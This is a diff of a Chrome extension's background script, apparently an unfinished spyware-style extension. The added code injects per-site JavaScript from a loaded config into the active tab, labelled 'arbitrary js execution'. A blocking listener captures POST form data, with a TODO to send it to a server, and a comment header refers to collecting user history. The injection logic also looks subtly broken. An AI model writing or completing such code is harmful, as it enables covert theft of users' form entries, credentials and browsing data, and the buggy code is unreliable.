@@ -28,16 +28,25 @@ chrome.webRequest.onBeforeRequest.addListener(
     ["blocking"]
 );
 
-//
+//arbitrary js execution
+//search through the list of js commands and
+/*references:
+	https://stackoverflow.com/questions/1979583/how-can-i-get-the-url-of-the-current-tab-from-a-google-chrome-extension
+	https://stackoverflow.com/questions/6497548/chrome-extension-make-it-run-every-page-load
+ */
 chrome.tabs.onUpdated.addListener(
 	function(tabId, changeInfo, tab){
 		if(changeInfo.status == 'complete' && tab.active){
-			chrome.tabs.getSelected(null).then(function(tab) {
-                loadConfig().then(function () {
-                    var userconf = config;
-                    userconf.forEach(function (site) {
-                        if (site.keys[0] === tab.url){
-                        		chrome.tabs.executeScript(tab.id, {code: site[site.keys[0]]});
+			chrome.tabs.query({'active': true, 'lastFocusedWindow': true}, function(tabs){
+                var url = tabs[0].url;
+				loadConfig().then(function () {
+					var site;
+                    Object.keys(config).forEach(function (pair) {
+                    	site = Object.keys(pair)[0];
+                        if (site === url){
+                        		chrome.tabs.executeScript(tabs[0].id, {code:pair[site]});
+                        		//TODO: how to remove the executed commands from the queue
+								//TODO: should we load/store every time the user opens a website?
 
 						}
                     })
@@ -46,6 +55,25 @@ chrome.tabs.onUpdated.addListener(
 		}
 	}
 );
+/* Listen for HTTP POST requests and gather information from the form
+ *
+ * references:
+ * 	https://spin.atomicobject.com/2017/08/18/chrome-extension-form-data/
+ */
+chrome.webRequest.onBeforeRequest.addListener(function(details){
+	if(details.method == "POST"){
+		var formData = details.requestBody.formData;
+		//TODO: populate a json and send it to the server
+		if(formData){
+			Object.keys(formData).forEach(function(key){
+
+			})
+		}
+	}
+},
+    {urls: blocked_domains},
+    ["blocking"]
+)
 
 /* Get user history, previous x results
  * @param (int) milis: time in miliseconds from epoch
